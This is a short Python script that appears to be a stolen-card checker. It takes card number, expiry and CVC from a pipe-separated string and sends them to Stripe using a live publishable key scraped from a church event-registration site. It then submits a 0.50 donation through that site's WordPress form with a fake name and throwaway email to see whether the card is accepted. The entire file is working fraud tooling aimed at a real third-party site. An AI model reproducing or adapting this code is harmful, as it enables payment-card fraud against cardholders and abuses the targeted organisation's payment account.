import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Ff998a153d0%3B+stripe-js-v3%2Ff998a153d0%3B+card-element&referrer=https%3A%2F%2Fpentecost.familyfed.eu&time_on_page=122581&key=pk_live_51MlYdjAD3HwNSgHziNbNLIi8Mq04rWRxSiCaOasxEyCaPJdicTar62m3VUK3kYpeB8yhf30V9FVQ14gk8KgGd5UW00vhKk5s5g'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': 'f05f8048-98bf-4242-a9c8-a9b565834f85db563b',
	    '__stripe_sid': '989f1c73-b821-4339-a3da-ecc6ffd799b53971e4',
	}
	
	headers = {
	    'authority': 'pentecost.familyfed.eu',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=f05f8048-98bf-4242-a9c8-a9b565834f85db563b; __stripe_sid=989f1c73-b821-4339-a3da-ecc6ffd799b53971e4',
	    'origin': 'https://pentecost.familyfed.eu',
	    'referer': 'https://pentecost.familyfed.eu/register-for-the-event/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1736327346771',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D474%26_fluentform_3_fluentformnonce%3D62150a160b%26_wp_http_referer%3D%252Fregister-for-the-event%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Bmiddle_name%255D%3D%26names%255Blast_name%255D%3DUser%26email%3Dlajaro6411%2540matmayer.com%26phone%3D2085812225%26country-list%3DUS%26payment_input_7%3DI%2520am%2520coming%2520with%2520my%2520sibling%252Ffriend%2520(Select%2520below)%26payment_input_4%3D20%26item-quantity%3D%26description%3D%26payment_input%3DOther%2520amount%26custom-payment-amount%3D0.50%26gdpr-agreement%3Don%26terms-n-condition%3Don%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=3'
	
	r2 = requests.post(
	    'https://pentecost.familyfed.eu/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
